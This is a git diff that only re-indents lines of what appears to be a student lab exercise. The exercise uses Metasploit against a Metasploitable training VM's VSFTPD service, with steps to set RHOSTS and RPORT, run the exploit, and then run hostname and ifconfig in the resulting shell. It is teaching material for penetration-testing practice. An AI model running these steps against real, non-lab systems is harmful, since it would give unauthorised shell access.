@@ -44,13 +44,13 @@ running the following command.
 
  10. Review the options of the exploit by typing the following command.
 
-	- ```show options```
+	 - ```show options```
 
  11. Set the remote host and the remote ports by using the following commands.
 
-	- ```set RHOSTS <Metasploitable IP Address>
+	 - ```set RHOSTS <Metasploitable IP Address>
 
-	- ```set RPORT <VSFTPD port number>
+	 - ```set RPORT <VSFTPD port number>
 
  12. Verify what payloads are available by using the "show payloads" command.
 
@@ -58,6 +58,6 @@ running the following command.
 
  14. Run the exploit by using the following command.
 
-	- ```exploit```
+	 - ```exploit```
 
  15. Once the shell is opened type ```hostname```, followed by ```ifconfig```. Include screenshot of output.
